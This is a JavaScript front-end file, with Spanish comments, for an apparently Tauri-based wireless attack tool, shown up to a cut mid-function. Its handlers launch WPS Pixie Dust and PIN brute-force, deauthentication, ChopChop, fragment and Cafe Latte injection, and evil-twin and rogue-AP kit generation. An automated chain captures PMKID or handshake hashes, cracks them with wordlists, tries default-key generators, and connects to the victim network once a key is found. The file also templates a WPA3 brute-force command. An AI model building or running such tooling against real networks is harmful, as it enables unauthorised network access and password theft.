window.doWpsPbc = async function () {
  const bssid = valOrEmpty($('wpspbc-bssid').value);
  const iface = valOrEmpty($('wpspbc-iface').value) || 'wlan0';
  const chEl = $('wpspbc-chan');
  const chRaw = (chEl && valOrEmpty(chEl.value)) || '';
  const channel = chRaw ? parseInt(chRaw) : selectedChannel();
  if (!bssid) { log('Especifica el BSSID del AP objetivo.', 'warn'); return; }
  log(`WPS PBC: BSSID=${bssid} iface=${iface}`, 'warn');
  currentAttackId = `wpspbc_${bssid.replace(/:/g,'')}`;
  showProgress(true);
  return invokeAttack('wps_pbc_attack_bg', { bssid, iface, channel });
};

window.doChopChop = async function () {
  const bssid    = valOrEmpty($('chopchop-bssid').value);
  const srcMac   = valOrEmpty($('chopchop-mac').value) || undefined;
  const iface    = valOrEmpty($('chopchop-iface').value) || 'wlan0mon';
  if (!bssid) { log('Especifica el BSSID del AP objetivo.', 'warn'); return; }
  log(`ChopChop: AP=${bssid} src=${srcMac || '00:11:22:33:44:55'} iface=${iface}`, 'warn');
  showProgress(true);
  return invokeAttack('chopchop_inject', { targetBssid: bssid, sourceMac: srcMac, iface });
};

window.doRogueAp = async function () {
  const essid  = valOrEmpty($('rogue-essid').value);
  const bssid  = valOrEmpty($('rogue-bssid').value) || undefined;
  const ch     = valOrEmpty($('rogue-chan').value) || '1';
  const iface  = valOrEmpty($('rogue-iface').value) || 'wlan0mon';
  if (!essid) { log('Especifica el ESSID del AP falso.', 'warn'); return; }
  log(`Evil Twin: ESSID=${essid} BSSID=${bssid || '00:11:22:33:44:55'} chan=${ch} iface=${iface}`, 'warn');
  showProgress(true);
  return invokeAttack('rogue_ap', { essid, bssid, channel: parseInt(ch) || 1, iface });
};

// Wrapper usado por los botones onclick="doCmd('name', handler)"
window.doCmd = function (cmdName, handler) {
  log(`>>> [${cmdName}] ejecutando…`, 'info');
  try {
    const result = handler();
    if (result instanceof Promise) {
      result.catch(err => log(`[${cmdName}] error: ${err}`, 'error'));
    }
    return result;
  } catch (err) {
    log(`[${cmdName}] error: ${err}`, 'error');
  }
};

async function invokeAttack(cmd, args) {
  if (attackIsBusy()) { log(`⚠️ Ya hay un ataque en curso; deténlo antes de lanzar ${cmd}.`, 'warn'); return false; }
  log(`>>> Rust invoke → ${cmd}  args=${JSON.stringify(args)}`, 'info');
  setAttackRunning(true, cmd + ' en curso…');
  const t0 = performance.now();
  try {
    const result = await window.__invoke(cmd, args);
    const ms   = Math.round(performance.now() - t0);
    const out  = result?.output || '';

    if (result?.error) {
      log(`[ERROR ${cmd}] ${result.error}`, 'error');
      return false;
    }
    // VERBOSE COMPLETO: la salida íntegra va al log (el historial y el pintado
    // ya son agrupados por frame, así que no satura). Sin recortes de 80 líneas.
    if (out) log(`[${cmd}]:\n${out}`, 'output');
    if (result?.stderr) log(`[${cmd}] stderr:\n${result.stderr}`, 'warn');
    if (result?.success) {
      log(`✅ ${cmd} completado en ${ms} ms`, 'ok');
      return true;
    } else {
      log(`⚠️  ${cmd} finalizó (code=${result?.exit_code ?? '?'}) en ${ms} ms`, 'warn');
      return false;
    }
  } catch (err) {
    log(`[FATAL ${cmd}] ${err}`, 'error');
    return false;
  } finally {
    setAttackRunning(false);
  }
}

// ── Tools detection ─────────────────────────────────────────────────────────
window.checkToolsStatus = async function () {
  const body = $('tools-status-body');
  if (!body) return;
  body.innerHTML = '<p style="font-size:11.5px;color:var(--muted)">Escaneando binarios…</p>';

  try {
    const result = await window.__invoke('detect_tools');
    const tools = result?.tools || [];
    const ready = result?.ready_count || 0;
    const total  = result?.total || tools.length;

    if (tools.length === 0) {
      body.innerHTML = '<p style="font-size:11.5px;color:var(--red)">No se pudo consultar el estado de herramientas.</p>';
      return;
    }

    let html = '';
    for (const t of tools) {
      const dotClass = t.found ? 'ok' : 'miss';
      const name     = t.found ? t.name : `${t.name}`;
      const path     = t.found ? t.full_path : t.install_hint || 'no encontrado';
      const ver      = t.version;
      html += `<div class="tool-row">
        <span class="tool-dot ${dotClass}"></span>
        <span class="tool-name">${esc(t.name)}</span>
        <span class="tool-path" title="${esc(path)}">${esc(path)}</span>
        <span class="tool-ver">${esc(ver)}</span>
      </div>`;
    }

    const summary = `<p style="font-size:11px;color:${ready === total ? 'var(--green)' : 'var(--orange)'};margin-top:4px">
      ${ready}/${total} herramientas listas ${ready === total ? '✅' : '⚠️ algunas faltan'}
    </p>`;

    body.innerHTML = html + summary;
    log(`Detectadas ${ready}/${total} herramientas listas.${ready < total ? ' Instala las faltantes con los hints mostrados.' : ''}`, ready < total ? 'warn' : 'ok');
  } catch (err) {
    body.innerHTML = `<p style="font-size:11.5px;color:var(--red)">Error consultando herramientas: ${esc(err)}</p>`;
    log(`[detect_tools] ERROR: ${err}`, 'error');
  }
};

window.findTool = async function (name) {
  if (!name) return;
  log(`>>> Buscando herramienta: ${name}`, 'info');
  try {
    const result = await window.__invoke('find_tool_cmd', { name });
    log(result.success ? `✅ ${result.output}` : `❌ ${result.output}`, result.success ? 'ok' : 'error');
  } catch (err) {
    log(`[find_tool] FATAL: ${err}`, 'error');
  }
};

// ── Interface status handler ──────────────────────────────────────────────────
window.doIfaceStatus = async function () {
  log('Obteniendo información del adaptador…', 'info');
  try {
    const result = await window.__invoke('wifi_interface_status');
    log(result?.output || JSON.stringify(result), 'info');
  } catch (err) {
    log(`[wifi_interface_status] ERROR: ${err}`, 'error');
  }
};

// ── List processes handler ────────────────────────────────────────────────────
window.doListProcs = async function () {
  log('Listando procesos de ataque…', 'info');
  try {
    const result = await window.__invoke('list_attack_processes');
    const out = result?.output || JSON.stringify(result) || 'No hay procesos activos.';
    log(out, 'info');
  } catch (err) {
    log(`[list_attack_processes] ERROR: ${err}`, 'error');
  }
};

window.doCleanup = async function () {
  const bssid = getSelectedBssid();
  log('Limpiando temporales de captura…', 'info');
  try {
    const result = await window.__invoke('cleanup_temp_files', { bssid: bssid || undefined, keepResults: true });
    if (result) {
      log(`Limpieza completada: ${result.deleted.length} eliminados, ${result.kept.length} conservados.`, 'ok');
      if (result.errors.length) log('Errores: ' + result.errors.join('; '), 'warn');
    }
  } catch (err) {
    log('[cleanup] FATAL: ' + err, 'error');
  }
};

// ── Init ─────────────────────────────────────────────────────────────────────
window.showTab('scan');

// Auto-scan con manejo de errores - no bloquea el inicio
setTimeout(async () => {
    try {
        await window.doScan();
    } catch (e) {
        console.error('Auto-scan falló:', e);
    }
    try {
        await window.loadCrackAssets();
    } catch (e) {
        console.error('Crack assets falló:', e);
    }
}, 600);// AUTO-ATTACK MAESTRO
// Ejecuta todos los ataques disponibles en secuencia contra un objetivo

window.autoAttack = async function () {
  // Botón ⚡ Auto de la barra scan-attack: misma secuencia honesta que el
  // Auto-Ataque grande (solo pasos implementados; RF solo si hay TX).
  return window.startAutoAttack();
};


// QUICK ATTACK - ataque rapido directo
window.quickAttack = function (type) {
  const bssid = getSelectedBssid();
  if (!bssid) return;
  if (type === 'pmkid') {
    const iface = valOrEmpty($('pmkid-iface').value) || undefined;
    log('Quick attack: PMKID capture en ' + bssid, 'warn');
    showProgress(true);
    return invokeAttack('pmkid_capture', { bssid, channel: selectedChannel(), durationSeconds: 60, iface });
  }
  if (type === 'deauth') {
    const iface = valOrEmpty($('deauth-iface').value) || undefined;
    log('Quick attack: Deauth en ' + bssid, 'warn');
    showProgress(true);
    return invokeAttack('deauth_inject', { bssid, clientMac: undefined, count: 5, iface });
  }
};

// Clear selection
window.clearSelection = function () {
  const sel = document.getElementById('attack-bssid');
  if (sel) sel.value = '';
  const auto = document.getElementById('auto-bssid');
  if (auto) auto.value = '';
  log('Seleccion limpiada', 'info');
};

// WPS Pixie Dust
window.doWpsPixieDust = async function () {
  const bssid = valOrEmpty(document.getElementById('pixie-bssid').value);
  const iface = valOrEmpty(document.getElementById('pixie-iface').value) || undefined;
  const chEl = document.getElementById('pixie-chan');
  const chRaw = chEl ? valOrEmpty(chEl.value) : '';
  const channel = chRaw ? parseInt(chRaw) : selectedChannel();
  if (!bssid) { log('Especifica el BSSID del AP.', 'warn'); return; }
  currentAttackId = `wpspix_${bssid.replace(/:/g,'')}`;
  showProgress(true);
  return invokeAttack('wps_pixiedust_bg', { bssid, iface, channel });
};

// Fragment Injection
window.doFragment = async function () {
  const bssid = valOrEmpty(document.getElementById('frag-bssid').value);
  const iface = valOrEmpty(document.getElementById('frag-iface').value) || undefined;
  if (!bssid) { log('Especifica el BSSID del AP.', 'warn'); return; }
  showProgress(true);
  return invokeAttack('fragment_inject', { bssid, iface });
};

// Cafe Latte
window.doCafeLatte = async function () {
  const bssid = valOrEmpty(document.getElementById('latte-bssid').value);
  const mac   = valOrEmpty(document.getElementById('latte-mac').value);
  const iface = valOrEmpty(document.getElementById('latte-iface').value) || undefined;
  if (!bssid || !mac) { log('Especifica BSSID y MAC del cliente.', 'warn'); return; }
  showProgress(true);
  return invokeAttack('cafe_latte_attack', { bssid, clientMac: mac, iface });
};

// Interactive Inject
window.doInteractive = async function () {
  const iface = valOrEmpty($('inter-iface').value) || undefined;
  showProgress(true);
  return invokeAttack('interactive_inject', { iface });
};

// Auto-attack maestro 8 pasos
window.startAutoAttack = async function () {
  if (attackIsBusy()) { log('⚠️ Ya hay un ataque en curso; deténlo antes de lanzar otro.', 'warn'); return; }
  const bssid = getSelectedBssid();
  if (!bssid) {
    log('Auto-ataque: sin BSSID. Escanea primero o usa Scan + Auto Ataque.', 'warn');
    return;
  }
  const wordlist = valOrEmpty(document.getElementById('auto-wordlist').value) || undefined;
  const iface    = valOrEmpty(document.getElementById('auto-iface').value) || undefined;

  log('==============================', 'warn');
  log(' AUTO-ATTACK INICIADO', 'warn');
  log(' Objetivo: ' + bssid, 'warn');
  log(' Wordlist: ' + (wordlist || 'por defecto'), 'warn');
  log('==============================', 'warn');

  const autoCh9 = selectedChannel();
  const clean9 = bssid.replace(/:/g, '');
  const essid9 = targetSsid();

  // ── Detección WSL HONESTA: 3 niveles, con fallback a ruta nativa ──
  // 1) binario wsl  2) distro kali-linux arranca  3) iface wlan0 presente.
  // Solo `wsl --version` da falsos positivos (WSL instalado, Kali no).
  let useWsl = false;
  try {
    const wslCheck = await window.__invoke('wsl_is_available');
    if (wslCheck && wslCheck.success) {
      log('wsl.exe presente: verificando distro kali-linux…', 'info');
      const distro = await window.__invoke('wsl_exec', { command: '/bin/true', args: [], timeoutSecs: 20 });
      if (distro && distro.success) {
        log('Distro kali-linux OK: verificando interfaz wlan0…', 'info');
        const ifaceChk = await window.__invoke('wsl_exec', { command: '/usr/sbin/ip', args: ['link', 'show', 'wlan0'], timeoutSecs: 20 });
        if (ifaceChk && ifaceChk.success) {
          useWsl = true;
          log('WSL2/Kali LISTO (distro + wlan0): se usará para ataques que requieren inyección.', 'ok');
        } else {
          log('Kali responde pero sin wlan0: el USB no está attach. Fallback a ruta Windows nativa.', 'warn');
          log('(Puedes attach el USB en la tarjeta WSL2/Kali y reintentar.)', 'info');
        }
      } else {
        log('kali-linux no arranca (' + (distro?.stderr || distro?.message || 'sin distro') + '). Fallback a ruta Windows nativa.', 'warn');
      }
    } else {
      log('WSL2 no disponible: se usará solo ruta Windows nativa.', 'warn');
    }
  } catch (e) {
    log('No se pudo verificar WSL2: ' + e + ' — ruta Windows nativa.', 'warn');
  }

  if (useWsl) {
    const busidEl = document.getElementById('wsl-busid');
    const busid = busidEl ? busidEl.value.trim() : '1-5';
    log('Auto-attach USB a Kali (busid=' + busid + ')…', 'info');
    try {
      const attach = await window.__invoke('wsl_attach', { busid });
      if (attach && attach.success) {
        log('USB attach a Kali OK.', 'ok');
      } else {
        log('USB attach falló: ' + (attach ? attach.message : 'error') + ' — Fallback a ruta Windows nativa.', 'warn');
        useWsl = false;
      }
    } catch (e) {
      log('USB attach error: ' + e + ' — Fallback a ruta Windows nativa.', 'warn');
      useWsl = false;
    }
  }

  const steps = [];
  if (useWsl) {
    steps.push(
      { n: '1/9 - PMKID (Kali)', cmd: 'wsl_pmkid_capture', args: { iface: 'wlan0', channel: autoCh9 || 11, durationSecs: 60 }, bgId: null },
      { n: '2/9 - Wash (Kali)', cmd: 'wsl_wash', args: { iface: 'wlan0', channel: autoCh9 || 11, durationSecs: 20 }, bgId: null },
      { n: '3/9 - Deauth (Kali)', cmd: 'wsl_deauth', args: { iface: 'wlan0', bssid, count: 10, channel: autoCh9 || 11 }, bgId: null },
      { n: '4/9 - Reaver (Kali)', cmd: 'wsl_reaver', args: { iface: 'wlan0', bssid, channel: autoCh9 || 11, durationSecs: 60, pixie: false }, bgId: null },
      { n: '5/9 - Convertir/crack (Win)', cmd: 'list_crack_assets', args: {}, bgId: null }
    );
  } else {
    // ── Ruta Windows NATIVA: solo lo implementado y funcional (sin TX) ──
    // perfil → monitor → captura Npcap → conversión .22000 → inspección →
    // crack → keygen → (conexión si el crack acierta). Los pasos RF solo se
    // añaden si check_injection_capability confirma TX.
    let natGuid = null, natPcap = null, natHash = null;

    steps.push({ n: '1/7 - Perfil del objetivo', run: async () => {
      try {
        const p = await window.__invoke('profile_target', { bssid });
        log(`[perfil] ${p.ssid}: ${p.title}`, 'info');
        log(p.detail, 'info');
        return true;
      } catch (e) { log(`[perfil] ${e}`, 'warn'); return false; }
    }});

    steps.push({ n: '2/7 - Modo monitor', run: async () => {
      try {
        const rep = await window.__invoke('detect_adapters');
        const ad = (rep.adapters || []).find(a => a.monitor_capable && a.guid);
        if (!ad) { log('Sin adaptador con modo monitor: la captura necesita uno (modal «Activar modo monitor»).', 'warn'); return false; }
        const r = await window.__invoke('activate_monitor', { ifaceGuid: ad.guid, channel: autoCh9 });
        log(`[monitor] ${ad.chipset}: ${r.message}`, r.success ? 'ok' : 'warn');
        if (r.success || (ad.monitor_active)) natGuid = ad.guid;
        return !!natGuid;
      } catch (e) { log(`[monitor] ${e}`, 'warn'); return false; }
    }});

    steps.push({ n: '3/7 - Captura Npcap nativa (60s)', run: async () => {
      if (!natGuid) { log('Captura omitida: sin GUID NPF. Activa el modo monitor y reintenta.', 'warn'); return false; }
      try {
        const r = await window.__invoke('native_capture', { ifaceGuid: natGuid, durationSecs: 60 });
        log(r.message, r.success ? 'ok' : 'error');
        if (r.success && r.output_file) {
          natPcap = r.output_file;
          const conv = $('convert-native-pcap'); if (conv) conv.value = r.output_file;
          return true;
        }
        return false;
      } catch (e) { log(`[captura] ${e}`, 'error'); return false; }
    }});

    steps.push({ n: '4/7 - Convertir a .22000', run: async () => {
      if (!natPcap) { log('Conversión omitida: no hay captura previa.', 'warn'); return false; }
      try {
        const c = await window.__invoke('pcap_to_22000', { pcapPath: natPcap });
        (c.messages || []).forEach(m => log('[convert] ' + m, 'info'));
        if (c.success && c.hash_count > 0) {
          natHash = c.output_file;
          const cx = $('crack-hash'); if (cx) cx.value = c.output_file;
          const ih = $('insp-hash'); if (ih) ih.value = c.output_file;
          return true;
        } else {
          log('Sin PMKID/EAPOL en la captura: hace falta tráfico de clientes contra el AP en su canal.', 'warn');
          return false;
        }
      } catch (e) { log(`[convert] ${e}`, 'error'); return false; }
    }});

    steps.push({ n: '5/7 - Inspeccionar hash', run: async () => {
      if (!natHash) { log('Inspección omitida: sin .22000.', 'warn'); return false; }
      try {
        const s = await window.__invoke('inspect_hash', { hashPath: natHash });
        log(`[inspect] total=${s.total} PMKID=${s.pmkid} challenge=${s.challenge} authorized=${s.authorized} ESSID=${(s.essids||[]).join(',')||'?'}`, 'info');
        return true;
      } catch (e) { log(`[inspect] ${e}`, 'warn'); return false; }
    }});

    steps.push({ n: '6/7 - Crack (diccionario)', run: async () => {
      if (!natHash) { log('Crack omitido: sin .22000.', 'warn'); return false; }
      try {
        const a = await window.__invoke('list_crack_assets');
        const wl = (a.wordlists || []).find(w => w.toLowerCase().includes('rockyou')) || (a.wordlists || [])[0];
        if (!wl) { log('Sin wordlists detectadas: instala rockyou.txt en tools/.', 'warn'); return false; }
        log('Wordlist: ' + wl, 'info');
        const r = await window.__invoke('pmkid_crack', { hashFile: natHash, wordlist: wl });
        log(r.output || r.stderr, r.success ? 'ok' : 'warn');
        if (r.success) {
          const m = (r.output || '').split('\n').find(l => l.includes('PASSWORD:'));
          const pass = m && m.split('PASSWORD:')[1]?.trim().split(':').pop();
          if (pass && essid9) {
            log('✅ CLAVE ENCONTRADA: ' + pass + ' — conectando…', 'ok');
            const cs = $('conn-ssid'); if (cs) cs.value = essid9;
            const cp = $('conn-pass'); if (cp) cp.value = pass;
            try {
              const c = await window.__invoke('wifi_connect', { ssid: essid9, password: pass });
              log(c.success ? '✅ CONECTADO a ' + essid9 : '⚠️ No conectó: ' + (c.stderr || c.output), c.success ? 'ok' : 'warn');
            } catch (e) { log('[connect] ' + e, 'warn'); }
          }
          return !!r.success;
        }
      } catch (e) { log(`[crack] ${e}`, 'error'); return false; }
    }});

    steps.push({ n: '7/7 - Keygen (claves por defecto)', run: async () => {
      const ssid = essid9;
      if (!ssid) { log('Keygen omitido: SSID desconocido (red oculta o sin scan).', 'warn'); return false; }
      try {
        const det = await window.__invoke('keygen_detect', { ssid });
        if (!det.success) { log('[keygen] ' + (det.output || det.stderr || 'sin algoritmo conocido para este SSID'), 'warn'); return false; }
        const r = /thomson/i.test(det.output || '')
          ? await window.__invoke('thomson_run', { ssid, bssid, maxKeys: 5 })
          : await window.__invoke('keygen_run', { ssid, bssid });
        const pre = $('keygen-out'); if (pre) pre.textContent = r.output || r.stderr;
        log(r.output || r.stderr, r.success ? 'ok' : 'warn');
        if (r.success) log('Candidatos keygen listos: pruébalos con wifi_connect o verifica contra el hash.', 'info');
        return !!r.success;
      } catch (e) { log(`[keygen] ${e}`, 'error'); return false; }
    }});

    // Pasos RF solo si la inyección funciona (no es el caso en RT3070+Npcap).
    try {
      const inj = await window.__invoke('check_injection_capability', { ifaceGuid: natGuid || iface || '' });
      if (inj.supported) {
        const npf = natGuid ? `NPF_{${natGuid}}` : iface;
        steps.push(
          { n: 'RF - WPS Pixie Dust', cmd: 'wps_pixiedust_bg', args: { bssid, iface: npf, channel: autoCh9 }, bgId: `wpspix_${clean9}` },
          { n: 'RF - WPS PIN Bruteforce', cmd: 'wps_bruteforce_reaver_bg', args: { bssid, iface: npf, channel: autoCh9 }, bgId: `wpsr_${clean9}` }
        );
        log('Inyección disponible: se añaden pasos WPS.', 'ok');
      } else {
        log('Inyección no disponible en este adaptador (esperado en RT3070+Npcap): se omiten los pasos RF.', 'warn');
      }
    } catch (e) { log('check_injection_capability: ' + e, 'warn'); }
  }

  window._autoStop = false;
  showProgress(true);
  setAttackRunning(true, 'Auto-ataque en curso…');
  // Cierre honesto: se cuenta qué pasos consiguieron algo real. Si todo se
  // omitió (sin adaptador, sin captura, sin hash…), el banner final lo dice
  // en vez de un «COMPLETADO» falso.
  let autoOk = 0, autoMiss = 0;
  for (const step of steps) {
    if (window._autoStop) { log('Auto-ataque cancelado por el usuario.', 'warn'); break; }
    const btn = document.getElementById('autoAttackBtn');
    if (btn) btn.textContent = step.n;
    updateProgress(10 + Math.round(80 * steps.indexOf(step) / steps.length), step.n);
    log('[' + step.n + ']...', 'warn');
    currentAttackId = step.bgId || null;
    let stepOk = false;
    if (step.run) { try { stepOk = (await step.run()) === true; } catch (e) { log(`[${step.n}] error: ${e}`, 'error'); } }
    else stepOk = (await invokeAttack(step.cmd, step.args)) === true;
    if (stepOk) autoOk++; else autoMiss++;
  }
  currentAttackId = null;
  showProgress(false);
  setAttackRunning(false);
  window._autoStop = false;

  try {
    const cleanup = await window.__invoke('cleanup_temp_files', { bssid, keepResults: true });
    if (cleanup) {
      log(`Limpieza: ${cleanup.deleted.length} archivos eliminados, ${cleanup.kept.length} conservados.`, 'info');
      if (cleanup.errors.length) log('Errores limpieza: ' + cleanup.errors.join('; '), 'warn');
    }
  } catch (e) {
    log('Limpieza pos-ataque falló: ' + e, 'warn');
  }

  log('==============================', autoOk > 0 ? 'ok' : 'warn');
  if (autoOk > 0) {
    log(` AUTO-ATTACK COMPLETADO: ${autoOk} paso(s) con resultado, ${autoMiss} omitido(s)/fallido(s)`, 'ok');
  } else {
    log(` AUTO-ATTACK SIN RESULTADO: ${autoMiss} paso(s) omitidos o fallidos (revisa los avisos de arriba)`, 'warn');
  }
  log('==============================', autoOk > 0 ? 'ok' : 'warn');
  const btn2 = document.getElementById('autoAttackBtn');
  if (btn2) btn2.textContent = 'Auto-Ataque';
};


// ── Estrategia de crack ───────────────────────────────────────────────────
window.loadCrackAssets = async function () {
  try {
    const a = await window.__invoke('list_crack_assets');
    const ruleSel = $('crackx-rule');
    if (ruleSel) {
      ruleSel.innerHTML = '<option value="">(sin regla)</option>' +
        (a.rules || []).map(r => `<option value="${esc(r)}">${esc(r)}</option>`).join('');
    }
    const dl = $('crackx-wl-list');
    if (dl) {
      dl.innerHTML = (a.wordlists || []).map(w => `<option value="${esc(w)}">`).join('');
    }
    const hint = $('crackx-hint');
    if (hint) {
      const parts = [`hashcat: ${a.hashcat === 'no encontrado' ? 'NO encontrado' : 'OK'}`,
        `${(a.rules || []).length} reglas`, `${(a.wordlists || []).length} wordlists`];
      if (!a.rockyou) parts.push('⚠ sin rockyou.txt — máscara o combinator recomendados');
      hint.textContent = parts.join(' · ');
    }
    log(`Assets crack: ${(a.rules || []).length} reglas, ${(a.wordlists || []).length} wordlists.`, 'info');
  } catch (e) {
    log(`[list_crack_assets] ERROR: ${e}`, 'error');
  }
};

window.inspectHash = async function () {
  const f = valOrEmpty($('insp-hash').value);
  if (!f) { log('Especifica el archivo .22000 a inspeccionar.', 'warn'); return; }
  try {
    const s = await window.__invoke('inspect_hash', { hashPath: f });
    const out = `total=${s.total} · PMKID=${s.pmkid} · challenge=${s.challenge} · authorized=${s.authorized}\nESSID: ${(s.essids || []).join(', ') || '?'}`;
    const pre = $('insp-out');
    if (pre) pre.textContent = out;
    log(`[inspect] ${f}: ${out.replace('\n', ' | ')}`, 'info');
  } catch (e) {
    log(`[inspect] ERROR: ${e}`, 'error');
  }
};

window.filterHash = async function () {
  const f = valOrEmpty($('insp-hash').value);
  const kind = $('insp-kind')?.value || 'pmkid';
  if (!f) { log('Especifica el archivo .22000 a filtrar.', 'warn'); return; }
  try {
    const r = await window.__invoke('filter_hash', { hashPath: f, kind });
    log(r.output, 'ok');
    const cx = $('crackx-hash');
    if (cx) cx.value = `${f}.${kind}`;
  } catch (e) {
    log(`[filter] ERROR: ${e}`, 'error');
  }
};

window.launchCustomCrack = async function () {
  const hash = valOrEmpty($('crackx-hash').value);
  const attack = parseInt($('crackx-mode')?.value || '0');
  const wl = valOrEmpty($('crackx-wordlist').value) || undefined;
  const rule = $('crackx-rule')?.value || undefined;
  const mask = valOrEmpty($('crackx-mask').value) || undefined;
  const sess = valOrEmpty($('crackx-session').value) || undefined;
  if (!hash) { log('Especifica el archivo .22000.', 'warn'); return; }
  if ((attack === 0 || attack === 1 || attack === 6 || attack === 7) && !wl) {
    log('Este modo necesita wordlist (¿sin rockyou? usa modo máscara).', 'warn'); return;
  }
  if ((attack === 3 || attack === 6 || attack === 7) && !mask) {
    log('Este modo necesita máscara (elige un preset).', 'warn'); return;
  }
  return invokeAttack('crack_custom', { hashFile: hash, attack, wordlist: wl, mask, rule, session: sess });
};

// ── Módulo WPA3 ─────────────────────────────────────────────────────────
window.useTargetForWpa3 = function () {
  const sel = $('attack-bssid');
  if (!sel?.value) { log('Selecciona un objetivo BSSID primero.', 'warn'); return; }
  const bssidInput = $('wpa3-bssid');
  if (bssidInput) bssidInput.value = sel.value;
  const opt = sel.options[sel.selectedIndex]?.text || '';
  const ssid = opt.split('·')[0]?.trim();
  const ssidInput = $('wpa3-ssid');
  if (ssid && ssidInput) ssidInput.value = ssid;
};

window.wpa3Audit = async function () {
  const bssid = valOrEmpty($('wpa3-bssid').value);
  if (!bssid) { log('Especifica el BSSID a auditar.', 'warn'); return; }
  try {
    const a = await window.__invoke('wpa3_audit', { bssid });
    const pre = $('wpa3-out');
    const txt = `${a.title}\n${a.detail}\nMFP: ${a.mfp}\nConfirmar: ${a.confirm_cmd_linux}\n${(a.next_steps || []).join('\n')}`;
    if (pre) pre.textContent = txt;
    log(`[wpa3] ${a.ssid} (${a.bssid}): ${a.title}`, 'info');
  } catch (e) {
    log(`[wpa3] ERROR: ${e}`, 'error');
  }
};

window.genRogueConf = async function () {
  const ssid = valOrEmpty($('wpa3-ssid').value);
  const ch = parseInt(valOrEmpty($('wpa3-chan').value) || '1');
  const iface = valOrEmpty($('wpa3-iface').value) || undefined;
  const out = valOrEmpty($('wpa3-confout').value) || undefined;
  if (!ssid) { log('Especifica el SSID a clonar.', 'warn'); return; }
  try {
    const r = await window.__invoke('gen_rogue_conf', { ssid, channel: ch, iface, outputPath: out });
    const pre = $('rogue-out');
    if (pre) pre.textContent = r.output;
    log(`[rogue] .conf generado para "${ssid}" CH${ch}. Úsalo con hostapd-mana en Kali.`, 'ok');
  } catch (e) {
    log(`[rogue] ERROR: ${e}`, 'error');
  }
};

window.fillWacker = function () {
  const bssid = valOrEmpty($('wpa3-bssid').value) || '<BSSID>';
  const opt = $('attack-bssid')?.options[$('attack-bssid')?.selectedIndex]?.text || '';
  const ssid = opt.split('·')[0]?.trim() || valOrEmpty($('wpa3-ssid').value) || '<SSID>';
  const wl = valOrEmpty($('wpa3-wl').value) || '<wordlist>';
  const iface = valOrEmpty($('wpa3-miface').value) || '<iface-managed>';
  const pre = $('wacker-out');
  if (pre) {
    pre.textContent =
      '# En Kali (adaptador en MANAGED mode, no monitor):\n' +
      '# git clone <repo-wacker> && revisa --help (los flags varían por versión)\n' +
      `python3 wacker.py --ssid "${ssid}" --bssid ${bssid} --wordlist ${wl} --interface ${iface}\n` +
      '# Lento (~1 intento/s, con rate-limit del AP) y ruidoso. Solo vs claves débiles.';
  }
};

// ── Evil Twin ───────────────────────────────────────────────────────────
window.useTargetForEvil = function () {
  const sel = $('attack-bssid');
  if (!sel?.value) { log('Selecciona un objetivo BSSID primero.', 'warn'); return; }
  const opt = sel.options[sel.selectedIndex]?.text || '';
  const ssid = opt.split('·')[0]?.trim();
  const ssidInput = $('et-ssid');
  if (ssid && ssidInput) ssidInput.value = ssid;
};

window.genEvilTwinKit = async function () {
  const ssid = valOrEmpty($('et-ssid').value);
  const ch = parseInt(valOrEmpty($('et-chan').value) || '1');
  const iface = valOrEmpty($('et-iface').value) || undefined;
  const gw = valOrEmpty($('et-gw').value) || undefined;
  const out = valOrEmpty($('et-outdir').value) || undefined;
  if (!ssid) { log('Especifica el SSID a clonar.', 'warn'); return; }
  try {
    const r = await window.__invoke('gen_eviltwin_kit', {
      ssid, channel: ch, ifaceAp: iface, gateway: gw, outputDir: out,
    });
    const pre = $('et-out');
    if (pre) pre.textContent = r.output;
    log(`[eviltwin] kit generado para "${ssid}". Coloca el .22000 y sigue README.txt en Kali.`, 'ok');
  } catch (e) {
    log(`[eviltwin] ERROR: ${e}`, 'error');
  }
};

window.verifyCandidate = async function () {
  const hash = valOrEmpty($('et-hash').value);
  const pass = $('et-pass')?.value || '';
  if (!hash) { log('Especifica el archivo .22000.', 'warn'); return; }
  if (!pass) { log('Escribe la clave candidata.', 'warn'); return; }
  try {
    const r = await window.__invoke('verify_candidate', { hashFile: hash, password: pass });
    log(r.success ? `✅ ${r.output}` : `❌ ${r.output || r.stderr}`, r.success ? 'ok' : 'warn');
    $('et-pass').value = '';
  } catch (e) {
    log(`[verify] ERROR: ${e}`, 'error');
  }
};

// ── Acceso: conectar + keygen ─────────────────────────────────────────────
function fillFromTarget(ssidInputId) {
  const sel = $('attack-bssid');
  if (!sel?.value) { log('Selecciona un objetivo BSSID primero.', 'warn'); return null; }
  const opt = sel.options[sel.selectedIndex]?.text || '';
  const ssid = opt.split('·')[0]?.trim();
  if (ssid) {
    const el = $(ssidInputId);
    if (el) el.value = ssid;
  }
  return { bssid: sel.value, ssid };
}

window.useTargetForConnect = function () {
  fillFromTarget('conn-ssid');
};

window.useTargetForKeygen = function () {
  const t = fillFromTarget('keygen-ssid');
  const kb = $('keygen-bssid');
  if (t && kb) kb.value = t.bssid;
};

window.wifiConnect = async function () {
  const ssid = valOrEmpty($('conn-ssid').value);
  const pass = $('conn-pass')?.value || '';
  if (!ssid || !pass) { log('SSID y clave requeridos.', 'warn'); return; }
  try {
    const r = await window.__invoke('wifi_connect', { ssid, password: pass });
    log(r.success ? `✅ ${r.output}` : `⚠️ ${r.output}\n${r.stderr}`, r.success ? 'ok' : 'warn');
    $('conn-pass').value = '';
  } catch (e) {
    log(`[connect] ERROR: ${e}`, 'error');
  }
};

window.wifiDisconnect = async function () {
  try {
    const r = await window.__invoke('wifi_disconnect');
    log(r.output || r.stderr, r.success ? 'ok' : 'warn');
  } catch (e) {
    log(`[disconnect] ERROR: ${e}`, 'error');
  }
};

window.keygenDetect = async function () {
  const ssid = valOrEmpty($('keygen-ssid').value);
  if (!ssid) { log('Especifica el SSID.', 'warn'); return; }
  try {
    const r = await window.__invoke('keygen_detect', { ssid });
    const pre = $('keygen-out');
    if (pre) pre.textContent = r.output || r.stderr;
  } catch (e) {
    log(`[keygen] ERROR: ${e}`, 'error');
  }
};

window.keygenRun = async function () {
  const ssid = valOrEmpty($('keygen-ssid').value);
  const bssid = valOrEmpty($('keygen-bssid').value);
  if (!ssid || !bssid) { log('SSID y BSSID requeridos.', 'warn'); return; }
  try {
    // Thomson → búsqueda SHA1 completa con límite configurable (thomson_run).
    const det = await window.__invoke('keygen_detect', { ssid });
    if (det.success && /thomson/i.test(det.output || '')) {
      const maxRaw = parseInt(valOrEmpty($('keygen-max').value));
      const maxKeys = (maxRaw >= 1 && maxRaw <= 50) ? maxRaw : 5;
      log(`Thomson detectado: búsqueda completa (máx. ${maxKeys}, ~21.8M hashes con threads)…`, 'info');
